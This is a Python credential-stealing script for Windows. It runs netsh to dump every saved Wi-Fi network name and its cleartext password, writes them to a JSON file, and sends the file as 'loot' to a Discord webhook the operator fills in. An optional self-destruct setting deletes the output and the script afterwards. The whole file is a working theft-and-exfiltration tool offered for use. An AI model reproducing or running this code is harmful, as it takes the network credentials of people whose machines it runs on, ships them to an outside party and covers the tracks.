#=======IMPORTS========#
import subprocess as sb
import re, platform
import json, random
from dhooks import Webhook, File
#======================#

# Add your Discord Webhook here
DISCORD_WEBHOOK = 'ENTER-THE-WEBHOOK-URL-HERE'

# To delete the script after finishing
# Warning: you will lose this file if you set the value to True
SELF_DESTRUCT = False


# Function which parses out the password from the output of the netsh command
def output2pass(buffer):
    buffer = buffer.decode('utf-8', errors="ignore").rstrip()
    try:
        passwd = re.findall('Key Content            : (.*)',buffer)[0]
    except IndexError:
        passwd = re.findall('Key Content            : (.*)',buffer)
    if passwd == []:
        passwd = "NULL"
    return passwd.rstrip()
    

# Function to send the output file to your discord server
def exfiltration(filename):
    hook  = Webhook(DISCORD_WEBHOOK)
    pc_name = platform.uname()[1]
    file = File(sb.os.getcwd()+'\\'+filename, name=pc_name+'.json')
    hook.send('Here is your loot :smiling_imp:', file=file)

# To check if the OS is windows
if sb.os.name != 'nt':
	exit()
	
# Get the output of the netsh command into ssid
ssid = sb.check_output(['netsh','wlan','show','profiles'], shell=True )
ssid  = ssid.decode('utf-8', errors="ignore").rstrip()

# To remove the unwanted headers
index = ssid.find('All User Profile     :')
ssid = ssid[index:]

# Get the raw ssids
ssids_raw = re.split('All User Profile     :',ssid)
ssids = []
for line in ssids_raw:
    if line == ' ' or line == '':
        continue
    else:
        ssids.append(line.strip())
 
# To store the password along with its ssid  as a dictionary
credentials = {}
for ssid in ssids:
    try:
        output = sb.check_output(['netsh','wlan','show','profile',f'{ssid}','key=','clear'], shell=True )
    except:
        continue
    passwd = output2pass(output)
    credentials[ssid] = passwd
    # print(f'SSID:{ssid} PASSWORD:{passwd}')

# To print the creds in json format
# print(json.dumps(credentials, sort_keys=True, indent=3))

# Outputs in a json file with random filename.
filename = str(random.randint(1000,10000))+'.json'
with open(filename, 'w') as f:
    f.write(json.dumps(credentials, sort_keys=True, indent=3))
    
# Send the output file to the discord webhook
exfiltration(filename)

# Deletes the output file and the script file
if SELF_DESTRUCT:
    sb.os.system(f'del {filename}')
    sb.os.system('del wifi_pass.py')